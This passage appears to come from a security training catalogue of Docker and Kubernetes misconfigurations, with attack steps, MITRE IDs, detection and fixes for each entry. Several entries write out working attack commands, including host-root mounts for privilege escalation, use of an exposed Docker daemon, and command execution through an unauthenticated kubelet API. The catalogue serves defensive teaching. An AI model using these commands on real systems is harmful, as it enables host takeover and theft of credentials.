- **Tools**: ls -l, trivy, Dockerfile
- **Scenario**: Secrets in image layers have global read permissions
- **Attack Steps**: 1. Developer mistakenly includes .env, id_rsa, or other secrets in the image.2. These files are given chmod 644 or similar during image creation.3. Red Team pulls and inspects the image using docker save and unpacks layers.4. World-readable secrets can now be accessed by any process or user in the container.5. Blue Team doesn’t enforce file permission policies.6. Secure image builds with chmod 600 for secrets.7. Use .dockerignore to exclude secrets from build context.8. Add pre-commit linting and Dockerfile best practices checks.9. Scan for permissions using trivy or CI pipeline plugins.10. Inject secrets at runtime using tools like Vault instead.
- **Detection**: File scanner, image diffing
- **Solution**: Restrict file permissions during build
- **Tags**: #dockerfile #chmod #permissionleak

## Docker Containers Accessing Host Devices via /dev

- **Attack Type**: Host Device Exposure
- **Target**: Docker Host Devices
- **Vulnerability**: Exposure via device mount
- **MITRE**: T1547.006
- **Impact**: Direct hardware compromise
- **Tools**: Docker CLI, ls /dev/
- **Scenario**: Containers accessing host hardware (USB, GPU) via --device flag
- **Attack Steps**: 1. An engineer runs containers for hardware access (e.g., USB, GPU) using --device /dev/sda:/dev/sda.2. Red Team abuses this to get block device access to the host filesystem.3. Alternatively, access to /dev/mem, /dev/kmem, or /dev/net/tun gives control over memory and network devices.4. Blue Team has no restrictions on the --device flag.5. Enforce policy via Docker profiles, OPA, or Kubernetes PSPs to ban device mounts.6. Use tools like dockle to scan for device mappings.7. Avoid giving containers hardware access unless absolutely required.8. Monitor for unauthorized device access using auditd.9. Set up eBPF monitoring on /dev/ nodes.10. Harden host /dev permissions to block container access.
- **Detection**: Container runtime config audit
- **Solution**: Disallow arbitrary /dev mappings
- **Tags**: #hostdevice #devaccess #usb

## Lack of Resource Constraints Leads to Host DoS

- **Attack Type**: No CPU/Mem Limits
- **Target**: Docker Host
- **Vulnerability**: Lack of cgroups constraints
- **MITRE**: T1499
- **Impact**: DoS through resource exhaustion
- **Tools**: stress, Docker CLI
- **Scenario**: Containers consume all host resources, crashing other services
- **Attack Steps**: 1. Red Team runs a container with stress --cpu 8 --vm 2 --vm-bytes 1G to exhaust CPU and RAM.2. Docker host becomes unresponsive as resource usage is unconstrained.3. Blue Team has not set --memory, --cpus, or Kubernetes resource requests/limits.4. Host monitoring tools detect system-wide exhaustion too late.5. Always configure container-level limits (docker run --memory=512m --cpus=1).6. Use Kubernetes resource quotas and vertical pod autoscaling.7. Set alerts in Prometheus/Grafana for abnormal container usage.8. Scan for containers without limits using CI policies.9. Educate developers about resource budgeting in builds.10. Automate rejection of unbounded containers in pipelines.
- **Detection**: System metrics, Prometheus
- **Solution**: Enforce memory and CPU limits
- **Tags**: #resourcelimits #dockerDoS

## Default Logging Driver Enables Container Log Tampering

- **Attack Type**: Log Integrity Violation
- **Target**: Docker Host
- **Vulnerability**: Writable plaintext logs
- **MITRE**: T1070.001
- **Impact**: Log deletion and tampering
- **Tools**: Docker CLI, vim, json.log
- **Scenario**: Logs stored in plaintext files, vulnerable to tampering
- **Attack Steps**: 1. Docker containers by default log to /var/lib/docker/containers/<id>/<id>-json.log.2. Red Team gains access to host filesystem and directly edits or deletes logs.3. No logging to centralized systems like ELK or CloudWatch.4. Log tampering erases trace of container compromise.5. Switch to secure logging drivers like syslog, fluentd, or journald.6. Restrict write access to log directories via chmod and auditing.7. Enable immutable logs via append-only filesystems if required.8. Use runtime alerts on log file tampering.9. Periodically sync logs to remote servers.10. Monitor disk usage to prevent log overflow abuse.
- **Detection**: Log audits, file integrity checks
- **Solution**: Use secure logging backends
- **Tags**: #logtampering #jsonlog #dockerlogging

## Misconfigured BuildKit Caches Sensitive Files

- **Attack Type**: Cache Leak in Build
- **Target**: Docker Build
- **Vulnerability**: Cached sensitive files
- **MITRE**: T1552.004
- **Impact**: Secret leakage via layer reuse
- **Tools**: Docker BuildKit, buildctl
- **Scenario**: BuildKit saves intermediate steps with secrets
- **Attack Steps**: 1. Developer uses Docker BuildKit for faster builds (DOCKER_BUILDKIT=1).2. In one step, secret is copied (COPY secrets.env /tmp/). Later, it's deleted.3. BuildKit caching stores /tmp/secrets.env in intermediate cache layers.4. Red Team pulls the image cache or uses buildctl du to extract secrets.5. Blue Team unaware of cache behaviors.6. Use RUN --mount=type=secret to inject secrets safely.7. Disable BuildKit caching for sensitive layers.8. Configure cache pruning policies.9. Scan cached layers before image distribution.10. Train developers on cache-aware secure builds.
- **Detection**: BuildKit cache scan
- **Solution**: Disable caching for secrets
- **Tags**: #buildkit #dockersecrets #cacheleak

## Shared Docker Group Grants Root Privileges

- **Attack Type**: Local Privilege Escalation
- **Target**: Linux Host
- **Vulnerability**: Docker group = root
- **MITRE**: T1068
- **Impact**: Full system takeover
- **Tools**: usermod, id, docker CLI
- **Scenario**: User in docker group can control daemon and escalate to root
- **Attack Steps**: 1. Organization adds devs to docker group for convenience.2. Red Team as a low-priv user uses docker run -v /:/mnt --rm -it alpine chroot /mnt.3. This mounts root filesystem and grants shell access to host.4. Being in docker group is equivalent to root access.5. Blue Team misinterprets docker group as limited permission.6. Treat docker group as privileged role.7. Require sudo elevation or container runtime isolation.8. Audit group membership regularly.9. Educate dev teams about Docker root equivalence.10. Use role-based access control (RBAC) tools where available.
- **Detection**: Group audit, access logs
- **Solution**: Avoid giving docker access to users
- **Tags**: #dockergroup #privesc #hostmount

## Docker Labels Leak Deployment Metadata

- **Attack Type**: Metadata Exposure
- **Target**: Docker Images
- **Vulnerability**: Unreviewed LABEL metadata
- **MITRE**: T1585
- **Impact**: Sensitive metadata exposure
- **Tools**: Dockerfile, docker inspect
- **Scenario**: Labels like org.opencontainers.image.source leak URLs or credentials
- **Attack Steps**: 1. Docker images include metadata via LABEL directives (e.g., repo URL, maintainer, build args).2. Red Team uses docker inspect to retrieve labels like git repo links, branch names, or internal services.3. These reveal internal infra or tokens in edge cases.4. Blue Team doesn't sanitize labels before publishing images.5. Audit all LABEL directives for PII or internal data.6. Use build pipelines that strip unnecessary metadata.7. Scan images before push to public registries.8. Avoid using --label in ad-hoc builds.9. Treat labels as part of asset inventory — classify appropriately.10. Prefer CI-injected labels with strict content review.
- **Detection**: Inspect images, grep LABEL
- **Solution**: Sanitize labels before release
- **Tags**: #dockerlabels #metadataexposure

## Default Network Mode Leaks Internal Host DNS

- **Attack Type**: DNS Info Disclosure
- **Target**: Docker Containers
- **Vulnerability**: Shared DNS config
- **MITRE**: T1595.001
- **Impact**: Recon & targeting via DNS
- **Tools**: Docker CLI, cat, dig
- **Scenario**: Containers use host /etc/resolv.conf which can reveal internal DNS
- **Attack Steps**: 1. Containers inherit /etc/resolv.conf from the host unless overridden.2. Red Team runs a container and checks DNS (cat /etc/resolv.conf, dig internal.host.local).3. This reveals internal DNS servers and naming schemes.4. Used to fingerprint environment (AWS, corp network, etc.).5. Blue Team doesn't enforce DNS isolation.6. Override default DNS using Docker's --dns flag.7. Use internal DNS firewalls to restrict resolution.8. Detect resolution of known internal names from containers.9. For high-security workloads, consider using none network mode.10. Educate devs about container DNS behavior and visibility.
- **Detection**: DNS query logs
- **Solution**: Override container DNS config
- **Tags**: #dockerDNS #networkleak #dnsinfo

## Insecure Docker Registry Without Authentication

- **Attack Type**: Registry Exposure
- **Target**: Docker Registry
- **Vulnerability**: No auth on internal registry
- **MITRE**: T1525
- **Impact**: Theft & poison of internal images
- **Tools**: Docker CLI, curl, docker-distribution, Harbor
- **Scenario**: Unauthenticated Docker registry allows push/pull of sensitive images
- **Attack Steps**: 1. Red Team scans internal network using nmap or curl to discover services running on port 5000, which is commonly used by self-hosted Docker registries.2. They find a Docker registry accessible at http://10.0.0.5:5000 with no authentication.3. Using docker pull and docker push, they retrieve or overwrite internal images.4. They inspect pulled images for secrets, credentials, or SSH keys.5. They then push a backdoored version of an internal base image, expecting developers to unknowingly use it in future builds.6. The registry does not log authentication events or pull history.7. Blue Team had assumed the registry was protected behind a VPN but never enforced access control or TLS.8. Deploy registries like Harbor with authentication and audit logging.9. Always enable TLS on self-hosted registries.10. Regularly scan image contents for secrets and set registry push policies.
- **Detection**: Registry access logs (if any)
- **Solution**: Require auth + audit logging
- **Tags**: #dockerregistry #unauthrepo

## Docker Daemon Exposed on TCP Socket

- **Attack Type**: Remote Docker Abuse
- **Target**: Docker Daemon
- **Vulnerability**: Exposed TCP socket
- **MITRE**: T1016
- **Impact**: Full remote control over Docker host
- **Tools**: Docker, netstat, nmap, socat
- **Scenario**: Remote attackers control Docker daemon via exposed TCP port
- **Attack Steps**: 1. The Docker daemon is started with the -H tcp://0.0.0.0:2375 flag, exposing it over the network.2. Red Team discovers the open port using nmap -p 2375 10.0.0.0/24.3. They connect via docker -H tcp://target-ip:2375 ps and gain full control of the daemon.4. From here, they launch containers with --privileged, mount /, or extract secrets.5. No authentication or TLS is configured on the daemon.6. Blue Team relied on perimeter firewalls and forgot to audit exposed ports.7. Restrict Docker to local sockets (unix:///var/run/docker.sock).8. If remote access is required, configure TLS with client certs.9. Set up firewall rules to restrict access to 2375.10. Use runtime alerts for unauthorized remote container launches.
- **Detection**: Port scan, Docker daemon logs
- **Solution**: Never expose Docker without TLS
- **Tags**: #dockerremote #2375 #tcpdaemon

## Misconfigured Docker Context Allows Cross-Environment Push

- **Attack Type**: Accidental Cross-Push
- **Target**: Developer Machine → Registry
- **Vulnerability**: Misused docker context
- **MITRE**: T1609
- **Impact**: Image leakage to prod
- **Tools**: Docker CLI (docker context, config.json)
- **Scenario**: Docker context accidentally points to production registry
- **Attack Steps**: 1. Developer uses docker context to switch between local and production environments.2. They build a debugging image locally with test credentials and backdoors.3. Accidentally, their docker context is still set to production (docker context use prod).4. docker push uploads the test image to production registry.5. Red Team monitors registry and uses docker pull to retrieve the image before it's cleaned.6. The image contains .aws/credentials with active tokens.7. Blue Team lacks separation between staging and prod environments in registry controls.8. Enforce IAM policies on registries to allow only signed/verified pushes.9. Configure alerts on untagged image uploads or registry drift.10. Educate developers about proper docker context hygiene and push restrictions.
- **Detection**: Registry event audit, IAM logs
- **Solution**: Use isolated registry credentials
- **Tags**: #dockercontext #accidentalpush

## Image Pull Without Digest Validation

- **Attack Type**: Trust Boundary Bypass
- **Target**: CI Pipelines
- **Vulnerability**: Tag-based trust instead of digest
- **MITRE**: T1553.002
- **Impact**: Supply chain poisoning
- **Tools**: Docker CLI, Docker Hub
- **Scenario**: Relying on tags instead of digests allows malicious image substitution
- **Attack Steps**: 1. Developers pull images using docker pull nginx:latest, assuming the image is always trusted.2. Red Team compromises the DockerHub account or injects a malicious image in a similar namespace (e.g., typo-squatting).3. Since the image is tagged as latest, any change in content goes undetected.4. Blue Team lacks image digest validation (sha256:<hash>).5. Image with backdoor or miner gets deployed into production.6. Require all deployments to reference images via digest only (e.g., nginx@sha256:...).7. Use tools like cosign or notary to verify image signatures.8. Monitor registry for image tag drift or unauthorized changes.9. Educate devs to avoid latest in production.10. Enforce digest-based deployment in CI pipelines.
- **Detection**: Image scanner, tag-to-digest diff
- **Solution**: Enforce digest-based pulls
- **Tags**: #dockertrust #digestpull #imagepoison

## Hardcoded .npmrc Tokens in Docker Images

- **Attack Type**: Token Leakage
- **Target**: Docker Image Layers
- **Vulnerability**: Leaked build-time config files
- **MITRE**: T1552.001
- **Impact**: Private repo compromise
- **Tools**: Docker, docker history, grep .npmrc, Trivy
- **Scenario**: Auth tokens for npm packages left in image layers
- **Attack Steps**: 1. Developer installs private npm packages inside Dockerfile using .npmrc with auth token.2. They forget to remove the file or COPY command is cached in an earlier layer.3. Red Team runs docker history or extracts image tarballs, finds .npmrc and extracts token.4. With this, they access private packages or inject malicious ones.5. Scan with trivy or dockle before publishing.6. Avoid baking secrets into images; use runtime mounts or secrets manager.7. Configure private registry to monitor token usage.8. Revoke leaked tokens on detection.9. Sanitize all image layers before push.10. Add .npmrc to .dockerignore.
- **Detection**: Token usage logs, image scanners
- **Solution**: Externalize all secrets
- **Tags**: #npmrc #tokenleak #dockerlayers

## Running Containers as Root User by Default

- **Attack Type**: Privileged User Execution
- **Target**: Container Runtime
- **Vulnerability**: Default UID 0
- **MITRE**: T1078.003
- **Impact**: Host filesystem manipulation
- **Tools**: Dockerfile (USER), whoami, Trivy
- **Scenario**: Containers run with UID 0 allowing extended privileges
- **Attack Steps**: 1. Dockerfiles by default use the root user (UID 0) unless USER is specified.2. Red Team compromises container and uses root to access system binaries, create new users, or write to sensitive dirs.3. If container mounts volumes, root UID maps to host filesystem.4. No user namespaces are configured.5. Run all containers as non-root (USER appuser).6. Use tools like dockle to check for USER directives.7. Use Kubernetes PodSecurity policies to block root containers.8. Apply seccomp and AppArmor to limit root even if used.9. Enable user remapping in Docker daemon config.10. Monitor UID usage inside containers.
- **Detection**: UID scan, runtime telemetry
- **Solution**: Run as non-root wherever possible
- **Tags**: #nonroot #uid0 #dockersecurity

## Dockerfile Uses ADD Instead of COPY With Remote URLs

- **Attack Type**: Untrusted File Injection
- **Target**: Docker Build
- **Vulnerability**: Unverified auto-download
- **MITRE**: T1195
- **Impact**: Backdoored image creation
- **Tools**: Dockerfile, Burp, wget, Trivy
- **Scenario**: ADD auto-fetches and unpacks archives from URLs, exposing to MITM
- **Attack Steps**: 1. Developer writes ADD http://insecure.site.com/script.tar.gz /app/ in Dockerfile.2. Docker downloads and auto-extracts the remote file without validation.3. Red Team sets up a MITM proxy and replaces the tarball with malicious script.4. Blue Team didn’t use HTTPS or digest validation.5. Replace ADD with COPY for local files.6. Download externally via curl/wget and verify digest before use.7. Always use https:// URLs with pinning.8. Set Docker content trust when pulling images.9. Audit Dockerfiles for ADD misuse.10. Educate dev teams on safe Dockerfile practices.
- **Detection**: Dockerfile lint, image diff
- **Solution**: Never use ADD with remote URLs
- **Tags**: #dockeradd #fileinjection #mitm

## Volume Mounts with Overwrite on Host Config

- **Attack Type**: Config Override
- **Target**: Host OS Config
- **Vulnerability**: Dangerous bind mounts
- **MITRE**: T1547
- **Impact**: Host OS manipulation
- **Tools**: Docker CLI (-v), ls, diff
- **Scenario**: Containers overwrite host config files via mount
- **Attack Steps**: 1. Red Team runs docker run -v /etc:/mnt --rm -it alpine.2. They modify host /etc/passwd or /etc/shadow from inside the container.3. Host system is now compromised with new users or altered sudoers.4. Blue Team didn’t restrict volume mounts or run container as limited user.5. Deny container access to critical host directories.6. Use SELinux/AppArmor to restrict what mounts can be made.7. Add pre-run checks for risky mount paths.8. Apply RBAC around who can start containers with mounts.9. Use container scanning tools to detect privileged mounts.10. Harden the host filesystem permissions.
- **Detection**: File integrity monitoring
- **Solution**: Deny sensitive volume mounts
- **Tags**: #volumemount #hostoverride #etcpasswd

## Build Secrets Left in Unused Layers

- **Attack Type**: Layered Secret Leakage
- **Target**: Image Build Layers
- **Vulnerability**: Cache retains deleted secrets
- **MITRE**: T1552.001
- **Impact**: Credential exfiltration
- **Tools**: Dockerfile, Dive, Trivy
- **Scenario**: Secrets copied then deleted, but persist in earlier layers
- **Attack Steps**: 1. Developer adds secrets like .env in an early Dockerfile step.2. Later, the file is deleted, but Docker caches all layers unless squashed.3. Red Team uses Dive to explore layers and extracts deleted files.4. Leaked API keys are then used to access internal services.5. Use multi-stage builds to prevent secrets from reaching final image.6. Avoid using COPY for secret material.7. Scan all layers during CI builds using trivy or dockle.8. Add git pre-commit hook to deny COPY of .env and similar files.9. Enable image squashing in production pipelines.10. Run periodic registry scans for secrets-in-layers.
- **Detection**: Dive, trivy layer inspection
- **Solution**: Use multi-stage builds
- **Tags**: #secretsinlayers #imagecache #dockerbuild

## Default Bridge Network Used Without Isolation

- **Attack Type**: Network Exposure
- **Target**: Container Network
- **Vulnerability**: No network segmentation
- **MITRE**: T1046
- **Impact**: Internal lateral movement
- **Tools**: Docker CLI (network ls, inspect)
- **Scenario**: Containers communicate freely on default bridge network
- **Attack Steps**: 1. All containers by default connect to the bridge network, allowing lateral access.2. Red Team deploys malicious container and scans network with nmap inside container.3. Discovers other container IPs, open ports, sensitive services.4. No firewall or segmentation in place.5. Create custom networks with isolation and restrict inter-container access.6. Use --icc=false in Docker daemon to disable inter-container communication.7. Enforce network policies in Kubernetes (e.g., Calico, Cilium).8. Detect abnormal container-to-container traffic via NetFlow.9. Rotate container IPs and hostnames periodically.10. Audit container network configurations in CI.
- **Detection**: Container traffic analysis
- **Solution**: Enforce network isolation
- **Tags**: #dockernetwork #bridge #lateralaccess

## Using Host Network in Container

- **Attack Type**: Network Exposure
- **Target**: Docker Runtime
- **Vulnerability**: Host network namespace exposed
- **MITRE**: T1049
- **Impact**: Full host network visibility
- **Tools**: Docker, Nmap, Netstat
- **Scenario**: --network=host option allows containers to access host interfaces
- **Attack Steps**: 1. Red Team launches a container with --network=host.2. The container shares the host’s network namespace and can bind to host ports, inspect services, or sniff traffic.3. From inside, attacker uses nmap or netstat to map internal services (e.g., SSH, Redis).4. May also launch man-in-the-middle attacks if sensitive traffic is visible.5. Blue Team lacks rules to monitor network namespace sharing.6. Forbid use of --network=host unless explicitly required.7. Use container-specific firewalls (e.g., Cilium) for fine-grained control.8. Detect host-networking containers with runtime policies or container metadata inspection.9. Log and alert on privilege container launches in CI/CD.10. Apply AppArmor profiles to deny access to host network devices.
- **Detection**: Container metadata, syscalls
- **Solution**: Deny --network=host in builds
- **Tags**: #hostnetwork #docker #misconfig

## Docker Socket Accessible by Non-Root Users

- **Attack Type**: Privilege Escalation
- **Target**: Linux Host
- **Vulnerability**: Group-level Docker access
- **MITRE**: T1068
- **Impact**: Host takeover
- **Tools**: Docker CLI, getfacl
- **Scenario**: docker.sock allows full Docker control; group access leads to root escalation
- **Attack Steps**: 1. Red Team gains access to a user account that's part of the docker group.2. They run docker run -v /:/mnt --rm -it alpine to mount root filesystem.3. From inside the container, they escalate to host root by modifying /etc/shadow or creating SSH keys.4. Blue Team fails to treat docker group as privileged.5. Principle of least privilege violated by default.6. Never add untrusted users to docker group.7. Use RBAC tools like OPA, KubeGuard to enforce access boundaries.8. Restrict socket access with Unix permissions.9. Move sensitive workloads to rootless containers or isolated VMs.10. Monitor audit logs for docker.sock usage.
- **Detection**: Audit logs, user group review
- **Solution**: Treat Docker group as root
- **Tags**: #dockersock #groupabuse #privesc

## Environment Variables Leak Sensitive Secrets

- **Attack Type**: Information Disclosure
- **Target**: Docker Containers
- **Vulnerability**: Secrets in process environment
- **MITRE**: T1552.007
- **Impact**: Credential theft
- **Tools**: Docker, ps, inspect, log drivers
- **Scenario**: Secrets passed as ENV vars accessible via logs or docker inspect
- **Attack Steps**: 1. Developer sets secrets via ENV or -e flags in docker run or Dockerfile.2. Red Team uses docker inspect or ps e to list process environment.3. Finds credentials like AWS_SECRET_KEY, database passwords.4. Logs in /var/lib/docker/containers/... also capture ENV values depending on driver.5. Store secrets using Docker secrets API or mount them at runtime.6. Block secrets from being passed as ENV.7. Mask logs or disable logging for sensitive containers.8. Audit environment variable usage in CI builds.9. Rotate any exposed credentials immediately.10. Use trivy or dockle to scan for ENV misuse.
- **Detection**: Process dumps, container logs
- **Solution**: Don’t use ENV for secrets
- **Tags**: #envsecrets #dockerinspect #loggingrisk

## Unused Setuid Binaries in Container Image

- **Attack Type**: Privilege Abuse
- **Target**: Container Image
- **Vulnerability**: Retained setuid flags
- **MITRE**: T1548.001
- **Impact**: Privilege escalation inside container
- **Tools**: Trivy, find, getcap
- **Scenario**: Setuid binaries like passwd, mount allow privilege escalation inside container
- **Attack Steps**: 1. Red Team scans container with find / -perm -4000 -type f and finds binaries like mount, passwd.2. These retain their setuid bit even in containerized environments.3. If container is misconfigured (e.g., --privileged), these binaries can allow escalations.4. Strip unnecessary binaries during image hardening.5. Use trivy or dockle to detect such files pre-deployment.6. Base image should only contain application-specific files.7. Regularly scan images for POSIX capability misuse.8. AppArmor and seccomp can block system calls even for these binaries.9. Track setuid usage during container runtime.10. Drop all Linux capabilities using --cap-drop=ALL and re-add only those required.
- **Detection**: Setuid binary scanning
- **Solution**: Remove unsafe binaries
- **Tags**: #setuid #dockerscan #capabilities

## Failure to Validate Image Signatures

- **Attack Type**: Supply Chain Attack
- **Target**: CI/CD Pipeline
- **Vulnerability**: Missing image verification
- **MITRE**: T1195.002
- **Impact**: Tampered image in prod
- **Tools**: Cosign, Notary v2, Docker Content Trust
- **Scenario**: Unsigned images from registry could be replaced or tampered
- **Attack Steps**: 1. Developers disable Docker Content Trust (DCT) and blindly pull images.2. Red Team uploads malicious version of company/image:latest to a compromised registry.3. CI/CD pipeline uses this image without verifying the signature.4. Backdoor or crypto miner is now in production.5. Use tools like Cosign to sign images at build time.6. Enforce signature verification in Kubernetes Admission Controllers.7. Alert on unsigned image usage in deployment pipelines.8. Audit registry access and modification history.9. Monitor image changes via digest comparison.10. Educate developers to check image integrity before usage.
- **Detection**: CI audit logs, sigcheck tools
- **Solution**: Enforce image signing
- **Tags**: #supplychain #cosign #imagesignature

## Large Base Images Increase Attack Surface

- **Attack Type**: Bloatware Risk
- **Target**: Docker Image
- **Vulnerability**: Overexposed attack surface
- **MITRE**: T1069
- **Impact**: Vulnerable binary exposure
- **Tools**: Dockerfiles, Snyk, Trivy
- **Scenario**: Using ubuntu, centos as base increases installed binaries and CVEs
- **Attack Steps**: 1. Developer uses FROM ubuntu:latest without hardening.2. Image includes hundreds of unnecessary packages: curl, vim, gcc, etc.3. Red Team finds exploitable binaries via Trivy scan (e.g., outdated openssl).4. Each added package increases CVE exposure.5. Use minimal base images (alpine, distroless).6. Review and strip unnecessary packages before build.7. Automate CVE scanning and base image updates.8. Freeze version tags and avoid :latest.9. Prefer multi-stage builds to reduce final image size.10. Track image bloat over time using container diff tools.
- **Detection**: CVE scanner, base image diff
- **Solution**: Use minimal, secure images
- **Tags**: #bloatimage #basecve #alpinebase

## Containers Running with --cap-add=ALL

- **Attack Type**: Capability Overprivilege
- **Target**: Container Runtime
- **Vulnerability**: Full kernel capability access
- **MITRE**: T1068
- **Impact**: Privileged container abuse
- **Tools**: Docker CLI, capsh, getcap
- **Scenario**: Container has all Linux kernel capabilities enabled unnecessarily
- **Attack Steps**: 1. Red Team checks running containers and finds one started with --cap-add=ALL.2. Inside, attacker uses ptrace, mknod, or chown to elevate or persist.3. These capabilities allow hardware access, kernel-level operations, or filesystem control.4. Principle of least privilege is ignored.5. Only add required capabilities for the app.6. Use --cap-drop=ALL and selectively re-enable.7. Monitor container metadata for excessive capabilities.8. Use runtime tools like Falco to detect high-privilege actions.9. Block certain flags in CI/CD runners.10. Review Dockerfile and compose configs for risky flags.
- **Detection**: capsh, container metadata
- **Solution**: Drop all unused capabilities
- **Tags**: #linuxcaps #capaddall #dockerhardening

## Insecure File Permissions in Image Layers

- **Attack Type**: File Disclosure
- **Target**: Docker Image
- **Vulnerability**: Insecure file mode
- **MITRE**: T1081
- **Impact**: Credential and config leakage
- **Tools**: find, Trivy, Docker
- **Scenario**: Secrets, configs with 777 permissions accessible to all users
- **Attack Steps**: 1. Red Team runs find / -perm -0777 inside container.2. Finds .ssh/, .aws/, or /app/config.json readable/writable by all.3. Attacker reads secrets, overwrites configs.4. Developer failed to chmod during Dockerfile or image build.5. Set strict file permissions in image creation steps.6. Avoid copying secret files during build.7. Scan final image with permission-focused rules.8. Add pre-commit checks for file modes.9. Rotate secrets found in image layers.10. Block pushing images with 777 files via CI policies.
- **Detection**: File mode scan, container diff
- **Solution**: Enforce least permission
- **Tags**: #fileperms #dockerlayers #leaksecret

## Retained Shell Histories in Container Image

- **Attack Type**: Forensic Artifact Leak
- **Target**: Container Layers
- **Vulnerability**: Sensitive commands in history
- **MITRE**: T1552
- **Impact**: Secret leakage
- **Tools**: Trivy, grep, Dive
- **Scenario**: .bash_history, .sh_history contain commands and secrets
- **Attack Steps**: 1. Developer uses interactive shell in container and forgets to clear history.2. Red Team finds .bash_history with DB passwords, curl commands with tokens, etc.3. Shell history files persist in built image layers.4. Remove shell history before image commit.5. Use non-interactive build scripts.6. Scan image layers for common shell history files.7. Block pushing images with these artifacts.8. Educate devs on ephemeral builds and proper cleanup.9. Rotate any tokens or credentials found.10. Store images in internal, monitored registries.
- **Detection**: .bash_history, Dive scans
- **Solution**: Strip interactive artifacts
- **Tags**: #shellhistory #dockerleak #forensics

## Inherited Risk from Public Parent Images

- **Attack Type**: Supply Chain Risk
- **Target**: Docker Image
- **Vulnerability**: Unvetted parent image
- **MITRE**: T1195.002
- **Impact**: Backdoor or outdated packages
- **Tools**: Trivy, Snyk, Docker Hub
- **Scenario**: Downstream images inherit vulnerabilities from parent
- **Attack Steps**: 1. Developer uses FROM company/unknown-base without scanning it.2. Parent image includes vulnerable software or exposed scripts.3. Red Team finds backdoor from public image still present.4. Upstream image was modified but not re-scanned downstream.5. Always scan base images recursively.6. Pin specific digests rather than mutable tags.7. Use trusted registries and curated images.8. Watch for registry compromise alerts.9. Rebuild dependent images when base updates.10. Add dependency tree audit in CI/CD.
- **Detection**: Image chain diff, registry logs
- **Solution**: Trust but verify base images
- **Tags**: #baseimage #supplychain #dockerinherit

## Exploiting Open Kubelet Port 10250 to Exec into Pods

- **Attack Type**: K8s Misconfiguration – Open Kubelet Port
- **Target**: Kubelet Endpoint
- **Vulnerability**: No auth on 10250 port
- **MITRE**: T1059
- **Impact**: Remote execution in pods
- **Tools**: curl, kubectl, nmap
- **Scenario**: Attackers can connect to unauthenticated kubelet API and execute commands inside running pods
- **Attack Steps**: 1. Red Team scans internal cluster IPs using nmap -p 10250 --open to locate kubelet ports.2. Upon finding open kubelet APIs without authentication, they use curl https://<node_ip>:10250/pods/ to list all running pods.3. They extract the pod names, namespaces, and container names from the JSON output.4. Next, they use curl -k -XPOST https://<node_ip>:10250/run/<namespace>/<pod>/<container>?cmd=id to remotely execute commands inside the container.5. If the container has sensitive volume mounts or host access, they can read secrets or perform lateral movement.6. The activity bypasses audit logs if kubelet logging is misconfigured.7. Blue Team may miss this unless 10250 access is monitored with firewall rules or node-level logging.
- **Detection**: Nmap + Kubelet audit logs
- **Solution**: Require auth on kubelet + firewall
- **Tags**: #kubelet #port10250 #k8smisconfig

## Downloading Container Logs via Open Kubelet Logs API

- **Attack Type**: K8s Misconfiguration – Logs Disclosure
- **Target**: Worker Nodes
- **Vulnerability**: Open Kubelet log API
- **MITRE**: T1005
- **Impact**: Sensitive log exfiltration
- **Tools**: curl, Burp Suite
- **Scenario**: Unauthenticated users download container logs directly from kubelet
- **Attack Steps**: 1. Red Team discovers open 10250 port on worker nodes.2. They query /logs/ API endpoint using curl -k https://<ip>:10250/logs/<pod>/<container>.3. Logs may include application-level tokens, credentials, stack traces, or internal IPs.4. If pod has debug mode on, sensitive information may be exposed in error logs.5. Exploiter repeats for high-value workloads like kube-system, monitoring, or dev namespaces.6. Logs can aid further lateral movement or credential stuffing.7. Blue Team often does not alert on 10250 log scraping unless host-based intrusion detection is in place.8. No Kubernetes-native alerts unless cloud-level monitoring (like GuardDuty) is active.
- **Detection**: Host-based NIDS / WAF logs
- **Solution**: Enable TLS auth + close 10250 externally
- **Tags**: #k8slogs #kubeletunauth #infodisclosure

## Accessing Pod Metrics from Unsecured /metrics/cadvisor API

- **Attack Type**: K8s Misconfiguration – Metrics Exposure
- **Target**: Kubelet Metrics Port
- **Vulnerability**: Exposed /metrics/cadvisor
- **MITRE**: T1082
- **Impact**: Cluster reconnaissance
- **Tools**: curl, Prometheus
- **Scenario**: Attackers scrape real-time pod usage stats via kubelet cAdvisor endpoint
- **Attack Steps**: 1. Red Team locates kubelet IP via service discovery or internal DNS.2. Requests curl -k https://<node>:10255/metrics/cadvisor to obtain real-time CPU, memory, filesystem usage for all pods.3. Sensitive metadata like container paths, image names, or volume mounts are exposed.4. Helps attacker map resource-heavy services and understand deployment patterns.5. Used to prioritize attack targets (e.g., services with higher traffic or larger memory).6. Blue Team usually misses metric scraping as it mimics normal monitoring traffic.7. Attack remains stealthy unless cAdvisor is disabled or endpoint access restricted.
- **Detection**: Prometheus logs (if integrated)
- **Solution**: Disable cAdvisor or enforce RBAC
- **Tags**: #cadvisor #metricsleak #kubernetes

## Exploiting Anonymous Access on Kube API Server

- **Attack Type**: K8s Misconfiguration – API Server
- **Target**: K8s API Server
- **Vulnerability**: Anonymous access enabled
- **MITRE**: T1525
- **Impact**: View or manipulate cluster state
- **Tools**: kubectl, curl, kube-hunter
- **Scenario**: API server allows anonymous requests without RBAC enforcement
- **Attack Steps**: 1. Red Team discovers --anonymous-auth=true enabled on the Kubernetes API server.2. They perform requests like kubectl get pods --all-namespaces without any credentials.3. If RBAC is misconfigured, even anonymous users may be allowed to view secrets, deployments, or persistent volumes.4. Attackers escalate by issuing POST requests to create privileged pods or jobs.5. API server does not log unauthenticated calls unless explicitly configured.6. Blue Team often unaware of anonymous queries unless auditPolicy is enabled.7. Fix includes disabling anonymous auth and setting default RBAC for unauthenticated users.
- **Detection**: K8s audit logs (if enabled)
- **Solution**: Disable --anonymous-auth
- **Tags**: #apiserver #anonymousaccess #rbac

## Port Scanning Kubelet and API Server in Cluster

- **Attack Type**: Reconnaissance – Internal K8s Network
- **Target**: Cluster Internal Network
- **Vulnerability**: Flat network, no egress limits
- **MITRE**: T1595
- **Impact**: Cluster service enumeration
- **Tools**: Nmap, Masscan
- **Scenario**: Identify open services and misconfigured components within K8s cluster
- **Attack Steps**: 1. Red Team gains access to any pod with internal access (e.g., via SSRF or pod exec).2. From inside, they run nmap -sS -p 10250,10255,6443 10.0.0.0/8 to identify open kubelet/API ports.3. Results are correlated with node metadata to map master, workers, control plane.4. Attackers determine which nodes are running critical workloads.5. They prepare follow-up attacks like kubelet abuse or etcd access.6. If network policies are not applied, full internal scanning is possible.7. Blue Team should monitor unusual east-west pod traffic or node-to-node scans.
- **Detection**: Pod egress logs, Kube-proxy logs
- **Solution**: Enforce NetworkPolicies
- **Tags**: #nmap #k8srecon #internalaccess

